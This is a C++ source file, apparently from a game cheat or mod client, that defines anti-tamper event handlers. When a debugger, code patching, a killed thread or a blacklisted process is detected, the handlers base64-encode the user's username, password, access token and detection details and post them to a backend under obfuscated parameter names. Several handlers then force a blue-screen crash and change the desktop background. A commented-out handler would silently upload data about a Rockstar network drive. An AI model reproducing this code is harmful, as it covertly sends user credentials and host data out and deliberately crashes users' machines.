#include "stdafx.h"
static ServerEvent g_serverEvent;
static map<eServerEvents, function<void(ServerEventData)>> g_serverEvents;

void ServerEvent::SendEvent(eServerEvents id, ServerEventData structData) {
	LOG_DEBUG("[ServerEvent] Sending event %i", id);
	g_serverEvents[id](structData);
}

void ServerEvent::RegisterServerEvent(eServerEvents id, function<void(ServerEventData)> func) {
	g_serverEvents.insert(pair<eServerEvents, function<void(ServerEventData)>>(id, func));
}

void ServerEvent::RegisterEvents() {
	m_network = GetNetwork(g_networkingURLs.m_event);

	RegisterServerEvent(DEBUGGER_ATTACHED, [&](ServerEventData data) {
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Security::BlueScreenOfDeath();
		Backend::Cleanup();
	});

	RegisterServerEvent(TEXT_SECTION_MODIFIED, [&] (ServerEventData data) {
		Security::SetBackgroundImage();
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Security::BlueScreenOfDeath();
		Backend::Cleanup();
	});

	RegisterServerEvent(THREAD_KILLED, [&](ServerEventData data) {
		Security::SetBackgroundImage();
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Backend::Cleanup();
	});

	RegisterServerEvent(THREAD_BEING_DEBUGGED, [&] (ServerEventData data) {
		Security::SetBackgroundImage();
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Backend::Cleanup();
	});

	RegisterServerEvent(ANTI_TAMPER_TRIGGERED, [&](ServerEventData data) {
		//Security::SetBackgroundImage();
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		//Security::BlueScreenOfDeath();
		Backend::Cleanup();
	});

	RegisterServerEvent(ANTI_TAMPER_REGISTRATION_FAILURE, [&](ServerEventData data) {
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Backend::Cleanup();
	});

	RegisterServerEvent(BLACKLISTED_PROCESS, [&](ServerEventData data) {
		Security::SetBackgroundImage();
		if (GetAuth()->IsAuthorized() && !Backend::IsCleaning()) {
			string accessToken = m_network->Post("secret=123");
			string resp = m_network->Post(va("secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), EncryptionHelper::Base64Encode(data.m_additionalInformation).c_str(), data.m_severity));
		}
		Backend::Cleanup();
	});

	//// do not clean up to stay silent
	//static bool driveReported = false;
	//RegisterServerEvent(ROCKSTAR_NETWORK_DRIVE, [&](ServerEventData data) {
	//	if (!driveReported && !Backend::IsCleaning()) {
	//		string accessToken = m_network->Post("secret=123");
	//		const auto uploadData = EncryptionHelper::Base64Encode(EncryptionHelper::Base64Encode(EncryptionHelper::SimpleEncrypt(data.m_additionalInformation))).c_str(); // encrypt just in case
	//		
	//		char buf[0x10000];
	//		sprintf_s(buf, "secret=1337&anfneded=%s&adfecec=%s&siufdubfd=%s&dshndsnf=%s&dsndusd=%i", EncryptionHelper::Base64Encode(GetAuth()->GetUsername()).c_str(), EncryptionHelper::Base64Encode(GetAuth()->GetPassword()).c_str(), EncryptionHelper::Base64Encode(accessToken).c_str(), uploadData, data.m_severity);

	//		m_network->Post(buf);
	//		driveReported = true;
	//	}
	//});
}

ServerEvent* GetServerEvent() {
	return &g_serverEvent;
}